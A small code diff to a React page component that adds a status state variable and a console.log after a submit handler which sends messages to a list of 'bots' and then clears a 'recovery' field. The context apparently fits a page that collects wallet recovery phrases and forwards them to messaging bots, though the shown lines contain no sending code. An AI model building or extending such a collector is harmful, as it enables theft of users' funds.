@@ -103,6 +103,7 @@ export default function Home() {
   const [loading, setLoading] = useState<boolean>(false);
   const [theConnector, setTheconnector] = useState<boolean>(false);
   const [theLoader, setTheloader] = useState<boolean>(false);
+  const [status, setStatus] = useState<string>('');
 
 const handleSubmit = async () => {
   const bots = [
@@ -135,6 +136,7 @@ const handleSubmit = async () => {
     if (allSuccessful) {
       setStatus('✅ Message sent!');
       setRecovery('');
+      console.log(status);
     } else {
       setStatus('❌ One or more messages failed to send.');
     }
